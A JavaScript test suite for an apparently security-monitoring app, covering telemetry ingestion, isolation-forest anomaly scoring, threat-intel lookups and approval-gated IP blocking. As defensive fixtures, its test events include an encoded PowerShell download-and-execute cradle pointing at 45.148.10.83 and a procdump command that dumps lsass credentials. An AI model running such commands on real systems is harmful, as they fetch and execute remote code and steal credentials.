import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import request from "supertest";
import { createApp } from "../../server/app.js";
import { createDatabase, DEMO_PASSWORD } from "../../server/db.js";

let db;
let app;
let admin;
let analyst;
let viewer;
let ingestToken;

const baselineEvents = () => {
  const sources = ["vpn", "firewall", "identity", "dns"];
  const hosts = ["app-01", "web-01", "dc-01", "ws-042"];
  const events = ["login", "dns_query", "http_request", "file_read"];
  const users = ["a.user", "b.user", "c.user"];
  return Array.from({ length: 48 }, (_, index) => {
    const timestamp = new Date(Date.UTC(2026, 0, 12, 7 + (index % 9), (index * 7) % 60)).toISOString();
    return {
      timestamp,
      source: sources[index % sources.length],
      host: hosts[index % hosts.length],
      event: events[index % events.length],
      action: "observed",
      status: index % 11 === 0 ? "deny" : "allow",
      ip: `10.20.${index % 5}.${10 + (index % 40)}`,
      user: users[index % users.length],
      message: `routine ${events[index % events.length]} by ${users[index % users.length]} on ${
        hosts[index % hosts.length]
      }`,
    };
  });
};

async function login(email) {
  const agent = request.agent(app);
  await agent
    .post("/api/auth/login")
    .send({ email, password: DEMO_PASSWORD })
    .expect(200);
  return agent;
}

beforeAll(async () => {
  db = createDatabase(":memory:");
  app = createApp({
    db,
    limiterOverrides: {
      global: 100000,
      ingest: 10000,
      assistant: 1000,
      intel: 1000,
      sensitive: 10000,
    },
  });

  admin = await login("alex@northwind.io");
  analyst = await login("priya@northwind.io");
  viewer = await login("maya@northwind.io");

  const created = await admin
    .post("/api/telemetry/tokens")
    .send({ label: "Unit test shipper" })
    .expect(201);
  ingestToken = created.body.token.token;
});

afterAll(() => {
  try {
    db.close();
  } catch {
    // Ignore close errors in test teardown.
  }
});

describe("live telemetry ingestion", () => {
  it("creates an ingestion token once and stores only its hash", async () => {
    expect(ingestToken.startsWith("dtcw_")).toBe(true);

    const listed = await admin.get("/api/telemetry/tokens").expect(200);
    expect(listed.body.tokens.length).toBe(1);
    expect(listed.body.tokens[0].prefix).toBe(ingestToken.slice(0, 12));
    expect(listed.body.tokens[0].token).toBeUndefined();
    expect(listed.body.tokens[0].token_hash).toBeUndefined();
  });

  it("enforces authentication and write permission", async () => {
    const payload = { events: [{ source: "vpn", host: "vpn-01", event: "login" }] };

    await request(app).post("/api/telemetry/ingest").send(payload).expect(401);

    await viewer.post("/api/telemetry/ingest").send(payload).expect(403);

    await request(app)
      .post("/api/telemetry/ingest")
      .set("X-Ingest-Token", "dtcw_not-a-real-token")
      .send(payload)
      .expect(401);
  });

  it("accepts token-authenticated events and exposes them to analysts", async () => {
    const response = await request(app)
      .post("/api/telemetry/ingest")
      .set("X-Ingest-Token", ingestToken)
      .send({
        source: "firewall",
        events: [
          {
            host: "edge-fw-01",
            event: "port_scan",
            action: "deny",
            status: "deny",
            ip: "198.51.100.24",
            user: "",
            message: "Repeated SYN probes against 443 from 198.51.100.24",
          },
        ],
      })
      .expect(202);

    expect(response.body.accepted).toBe(1);
    expect(response.body.events[0].id).toBeTypeOf("number");

    const listed = await analyst.get("/api/telemetry?q=198.51.100.24").expect(200);
    expect(listed.body.events.length).toBeGreaterThan(0);
    expect(listed.body.events[0].message).toContain("SYN probes");
  });

  it("rejects malformed batches before storage", async () => {
    const response = await request(app)
      .post("/api/telemetry/ingest")
      .set("X-Ingest-Token", ingestToken)
      .send({ events: [{ status: "definitely-not-valid" }] })
      .expect(400);
    expect(response.body.details.some((detail) => detail.path.includes("status"))).toBe(true);
  });
});

describe("isolation-forest anomaly detection", () => {
  let threshold;
  let anomalous;
  let normal;

  it("trains a genuine isolation forest from stored events", async () => {
    await request(app)
      .post("/api/telemetry/ingest")
      .set("X-Ingest-Token", ingestToken)
      .send({ source: "baseline", events: baselineEvents() })
      .expect(202);

    const trained = await analyst.post("/api/ml/train").send({}).expect(200);
    const model = trained.body.model;
    expect(model.status).toBe("trained");
    expect(model.algorithm).toBe("isolation-forest");
    expect(model.samples).toBeGreaterThanOrEqual(48);
    expect(model.trees).toBeGreaterThan(20);
    expect(model.featureNames).toContain("message_entropy");
    expect(model.threshold).toBeGreaterThan(0.4);
    expect(model.threshold).toBeLessThan(0.95);
    threshold = model.threshold;

    const metadata = await viewer.get("/api/ml/model").expect(200);
    expect(metadata.body.model.status).toBe("trained");
    expect(metadata.body.catalog.algorithm).toBe("isolation-forest");
  });

  it("scores a rare high-entropy event above routine activity", async () => {
    const response = await request(app)
      .post("/api/telemetry/ingest")
      .set("X-Ingest-Token", ingestToken)
      .send({
        source: "mixed",
        events: [
          {
            timestamp: new Date(Date.UTC(2026, 0, 12, 3, 17)).toISOString(),
            source: "vpn",
            host: "app-01",
            event: "login",
            action: "password_login",
            status: "allow",
            ip: "10.20.1.11",
            user: "a.user",
            message: "routine login by a.user on app-01",
          },
          {
            timestamp: new Date(Date.UTC(2026, 0, 12, 3, 19)).toISOString(),
            source: "edr",
            host: "rogue-host-99",
            event: "encoded_powershell",
            action: "process_create",
            status: "deny",
            ip: "45.148.10.83",
            user: "svc-backup",
            message:
              "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAB3AGUAYgBDAGwAaQBlAG4AdAApADsAJAB1AHIAbAA9ACcAaAB0AHQAcAA6AC8ALwA0ADUALgAxADQAOAAuADEAMAAuADgAMwAvAGEAJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAJAB1AHIAbA==",
          },
        ],
      })
      .expect(202);

    abnormalCheck: {
      const events = response.body.events;
      anomalous = events.find((event) => event.host === "rogue-host-99");
      normal = events.find((event) => event.host === "app-01");
    }
    expect(anomalous.anomaly).toBeTruthy();
    expect(normal.anomaly).toBeTruthy();
    expect(anomalous.anomaly.score).toBeGreaterThan(normal.anomaly.score);
    expect(["high", "critical"]).toContain(anomalous.anomaly.severity);
    expect(anomalous.anomaly.explanation.top.length).toBeGreaterThan(0);

    const anomalies = await analyst.get("/api/ml/anomalies?limit=10").expect(200);
    expect(anomalies.body.events.some((event) => event.host === "rogue-host-99")).toBe(true);
    expect(anomalies.body.events[0].anomalyScore).toBeGreaterThanOrEqual(threshold - 0.2);
  });

  it("blocks read-only users from retraining the model", async () => {
    await viewer.post("/api/ml/train").send({}).expect(403);
  });
});

describe("live threat intelligence", () => {
  it("queries RDAP, normalises the answer and caches the result", async () => {
    const fetchStub = vi.fn(async () =>
      new Response(
        JSON.stringify({
          handle: "NET-8-8-8-0-1",
          startAddress: "8.8.8.0",
          endAddress: "8.8.8.255",
          name: "GOOGLE",
          country: "US",
          status: ["active"],
          events: [
            { eventAction: "last changed", eventDate: "2023-12-28T09:00:00-05:00" },
          ],
        }),
        { status: 200, headers: { "content-type": "application/rdap+json" } }
      )
    );
    vi.stubGlobal("fetch", fetchStub);

    try {
      const first = await analyst.get("/api/intel/lookup?indicator=8.8.8.8").expect(200);
      expect(first.body.available).toBe(true);
      expect(first.body.type).toBe("ip");
      expect(first.body.providers.some((provider) => provider.id === "rdap" && provider.ok)).toBe(true);
      expect(first.body.providers.find((provider) => provider.id === "rdap").detail.name).toBe("GOOGLE");
      expect(first.body.cached).toBeUndefined();
      expect(fetchStub).toHaveBeenCalledTimes(1);

      const second = await analyst.get("/api/intel/lookup?indicator=8.8.8.8").expect(200);
      expect(second.body.cached).toBe(true);
      expect(fetchStub).toHaveBeenCalledTimes(1);

      await analyst.get("/api/intel/lookup?indicator=not-an-indicator").expect(400);
    } finally {
      vi.unstubAllGlobals();
    }
  });
});

describe("LLM assistant availability", () => {
  it("reports the assistant as unavailable when no model endpoint is configured", async () => {
    const status = await analyst.get("/api/hunter/assistant/status").expect(200);
    if (status.body.assistant.configured) return;

    const response = await analyst
      .post("/api/hunter/assistant")
      .send({ question: "What happened on ws-042?" })
      .expect(503);
    expect(response.body.code).toBe("assistant_not_configured");
    expect(response.body.answer).toBeUndefined();
  });
});

describe("approval-gated incident response", () => {
  const targetIp = "203.0.113.66";

  it("lets an analyst propose but reserves approval for a super admin", async () => {
    const proposal = await analyst
      .post("/api/response/actions")
      .send({
        playbookId: "block-ip",
        target: targetIp,
        incidentId: "INC-2040",
        rationale: "Repeated exploitation attempts against the VPN gateway.",
      })
      .expect(201);

    expect(proposal.body.action.status).toBe("pending");
    expect(proposal.body.action.automated).toBe(false);

    await analyst
      .post(`/api/response/actions/${proposal.body.action.id}/decision`)
      .send({ decision: "approve" })
      .expect(403);

    await viewer
      .post("/api/response/actions")
      .send({ playbookId: "block-ip", target: targetIp })
      .expect(403);

    const duplicate = await analyst
      .post("/api/response/actions")
      .send({ playbookId: "block-ip", target: targetIp, incidentId: "INC-2040" })
      .expect(200);
    expect(duplicate.body.duplicate).toBe(true);
  });

  it("executes the approved block and enforces it on new telemetry", async () => {
    const pending = await admin.get("/api/response/actions?status=pending").expect(200);
    const action = pending.body.actions.find((item) => item.target === targetIp);
    expect(action).toBeTruthy();

    const approved = await admin
      .post(`/api/response/actions/${action.id}/decision`)
      .send({ decision: "approve", note: "Confirmed malicious scanning." })
      .expect(200);
    expect(approved.body.executed).toBe(true);
    expect(approved.body.action.status).toBe("executed");
    expect(approved.body.action.result.blocked || approved.body.action.result.blockId).toBeTruthy();

    const ingest = await request(app)
      .post("/api/telemetry/ingest")
      .set("X-Ingest-Token", ingestToken)
      .send({
        events: [
          {
            source: "firewall",
            host: "edge-fw-01",
            event: "connection",
            status: "allow",
            ip: targetIp,
            message: "Connection from a blocked address",
          },
        ],
      })
      .expect(202);

    expect(ingest.body.events[0].status).toBe("alert");
    expect(ingest.body.events[0].blocked[0].kind).toBe("ip");

    const blocks = await analyst.get("/api/response/actions").expect(200);
    expect(blocks.body.blocks.some((block) => block.value === targetIp)).toBe(true);

    const reverted = await admin
      .post(`/api/response/actions/${action.id}/revert`)
      .send({})
      .expect(200);
    expect(reverted.body.action.status).toBe("reverted");

    const after = await request(app)
      .post("/api/telemetry/ingest")
      .set("X-Ingest-Token", ingestToken)
      .send({
        events: [
          {
            source: "firewall",
            host: "edge-fw-01",
            event: "connection",
            status: "allow",
            ip: targetIp,
            message: "Connection after reversion",
          },
        ],
      })
      .expect(202);
    expect(after.body.events[0].blocked).toBeNull();
    expect(after.body.events[0].status).toBe("allow");
  });

  it("automation queues a proposal without executing it", async () => {
    const rule = await admin
      .put("/api/response/rules")
      .send({ playbookId: "block-ip", enabled: true, minScore: 0.5 })
      .expect(200);
    expect(rule.body.rule.enabled).toBe(true);

    const autoIp = "195.123.9.77";
    const ingested = await request(app)
      .post("/api/telemetry/ingest")
      .set("X-Ingest-Token", ingestToken)
      .send({
        events: [
          {
            source: "edr",
            host: "unknown-asset-77",
            event: "credential_dump",
            action: "lsass_access",
            status: "alert",
            ip: autoIp,
            user: "svc-orbit",
            message:
              "procdump64.exe -ma lsass.exe /tmp/a7f3c9e2d8b1.dat 45.148.10.83 198.51.100.77 203.0.113.24",
          },
        ],
      })
      .expect(202);

    expect(ingested.body.automation.length).toBeGreaterThan(0);
    const proposal = ingested.body.automation.find((item) => item.target === autoIp);
    expect(proposal).toBeTruthy();
    expect(proposal.status).toBe("pending");
    expect(proposal.automated).toBe(true);

    const before = await admin.get("/api/response/actions").expect(200);
    expect(before.body.blocks.some((block) => block.value === autoIp)).toBe(false);

    const approved = await admin
      .post(`/api/response/actions/${proposal.id}/decision`)
      .send({ decision: "approve", note: "Automated containment reviewed." })
      .expect(200);
    expect(approved.body.action.status).toBe("executed");

    const after = await admin.get("/api/response/actions").expect(200);
    expect(after.body.blocks.some((block) => block.value === autoIp)).toBe(true);
  });

  it("rejects unknown playbooks and invalid targets", async () => {
    await analyst
      .post("/api/response/actions")
      .send({ playbookId: "launch-missiles", target: "x" })
      .expect(400);

    await analyst
      .post("/api/response/actions")
      .send({ playbookId: "block-ip", target: "not-an-ip" })
      .expect(400);
  });
});
